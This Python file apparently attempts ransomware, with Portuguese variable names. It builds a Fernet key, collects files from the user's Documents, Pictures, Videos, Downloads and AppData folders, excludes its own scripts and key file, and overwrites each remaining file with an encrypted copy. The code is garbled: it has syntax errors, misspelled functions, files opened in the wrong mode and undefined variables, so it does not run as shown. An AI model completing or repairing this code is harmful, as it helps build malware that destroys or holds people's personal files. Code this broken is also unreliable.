#import os
import cryptography.Fernet

key = Fernet.generate_key()
with open("chave_key","wb") as chave:
    chave_secreta  = chave.read()

username os = os.getenv(USERNAME)
folders = [os.path.join(r"C:\User", username, "Documents"),
           
           arquivos = 
           os.path.join (r"C:\Users", username, "Pictures")
           os.path.join (r"C:\Users", username, Videos"),

           os.path.join (r"\C:Users", username, "Downloads"),
           os.path.join (r"\C:Users, username, "Appdata, Local"),
                         os.pth.join (r"\C:Users, username, "AppData,  Roaming"),
           ]
            arquivos = []
            for root, files in os.walk(folder):
            
            if file in files
            if file in["juningameplay.py", "chave_key","Desktop.ini", "maycondouglas.py"]
            continue
            file_patch = os.patch.join(root,file)
            arquivos.append(file_patch)

            for arquivo in arquivos
            with open (arquivo, "rb") as file
            conteudo = file.read() 
            conteudo_criptografado = fernet(key).encrypt(conteudo)
            with open(arquivo, "rb") as file:
            file.write(conteudo_criptografado) 


               with open(arquivo, "wb") as File:
               file.write(conteudo_ descriptografado)
           
